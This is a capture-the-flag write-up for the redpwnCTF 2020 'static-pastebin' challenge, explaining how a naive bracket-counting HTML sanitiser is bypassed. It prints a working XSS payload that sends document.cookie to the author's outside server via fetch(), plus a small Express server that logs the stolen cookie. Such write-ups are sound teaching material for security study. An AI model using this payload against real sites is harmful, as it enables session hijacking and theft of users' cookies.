---
title: static-pastebin
date: 2020-06-23
tags: web, xss
ctf: redpwnCTF 2020
---
## Problem
```
I wanted to make a website to store bits of text, but I don't have any experience with web development. However, I realized that I don't need any! If you experience any issues, make a paste and send it here

Site: static-pastebin.2020.redpwnc.tf

Note: The site is entirely static. Dirbuster will not be useful in solving it.
```

## Solution
The site takes user input and creates a webpage using the given input. It encodes the input into base64 to create a paste, and then decodes it from the url to render it. For example, a paste with the text ```test``` generates the URL ```https://static-pastebin.2020.redpwnc.tf/paste/#dGVzdA==```, as ```dGVzdA==``` is the base64 encoding of ```test```.

The challenge also provides a link to submit a paste to the admin of the site, who would visit the link. Thus, this is XSS (cross site scripting) challenge.

Looking at the code to decode a paste, we see that there is very basic (and flawed) sanitzation being used to attempt to stop XSS attacks:

```js
(async () => {
    await new Promise((resolve) => {
        window.addEventListener('load', resolve);
    });

    const content = window.location.hash.substring(1);
    display(atob(content));
})();

function display(input) {
    document.getElementById('paste').innerHTML = clean(input);
}

function clean(input) {
    let brackets = 0;
    let result = '';
    for (let i = 0; i < input.length; i++) {
        const current = input.charAt(i);
        if (current == '<') {
            brackets ++;
        }
        if (brackets == 0) {
            result += current;
        }
        if (current == '>') {
            brackets --;
        }
    }
    return result
}

```

To get around this, we can begin our string with a ```>``` character to decrement ```brackets``` by 1. Then, we can add a ```<``` character which increments ```brackets``` back to 0, so that ```<``` is added to the result string.

Knowing this, we can create an XSS payload:
```html
><IMG SRC=/ onerror="fetch('https://api.sunnyzuo.com/' + document.cookie)">
```

This code will attempt to load an image from the ```/``` filepath where no image exists. This, the ```onerror``` code will exceute, which sends a request to https://sunnyzuo.com with the document as the url slug. We can create a basic server at the domain to log the cookie:

```js
const express = require('express');
const app = express();

app.get('*', function(req, res) {
    log(req.path);
});

app.listen(8000);
```

After sending the link to the admin bot, we find the flag in our logs:
```/flag=flag{54n1t1z4t10n_k1nd4_h4rd}```


**Flag:** ```flag{54n1t1z4t10n_k1nd4_h4rd}```